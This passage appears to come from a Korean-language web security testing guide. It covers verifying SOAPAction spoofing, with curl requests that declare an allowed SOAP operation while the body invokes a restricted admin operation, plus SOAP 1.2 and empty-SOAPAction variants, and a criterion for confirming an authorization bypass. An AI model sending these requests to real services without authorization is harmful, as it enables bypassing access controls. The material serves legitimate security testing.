### Phase 2: 동적 테스트 (검증)


**SOAPAction 변조 테스트:**
```
# 1단계: 정상 요청으로 허용된 오퍼레이션 확인
curl -X POST "https://target.com/ws/service" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"getUserInfo\"" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo xmlns="http://target.com/service">
      <userId>123</userId>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>'

# 2단계: SOAPAction은 허용된 오퍼레이션, Body는 제한된 오퍼레이션
curl -X POST "https://target.com/ws/service" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"getUserInfo\"" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getAdminConfig xmlns="http://target.com/service"/>
  </soap:Body>
</soap:Envelope>'
```

**SOAP 1.2 Action 변조 테스트:**
```
curl -X POST "https://target.com/ws/service" \
  -H "Content-Type: application/soap+xml; charset=utf-8; action=\"getUserInfo\"" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <getAdminConfig xmlns="http://target.com/service"/>
  </soap:Body>
</soap:Envelope>'
```

**빈 SOAPAction 테스트:**
```
# SOAPAction을 빈 값으로 설정
curl -X POST "https://target.com/ws/service" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"\"" \
  -d '...<restrictedOperation/>...'
```

**검증 기준:**
- **확인됨**: 동적 테스트로 SOAPAction 변조를 통해 제한된 오퍼레이션이 실행되거나 인가가 우회된 것을 직접 확인함
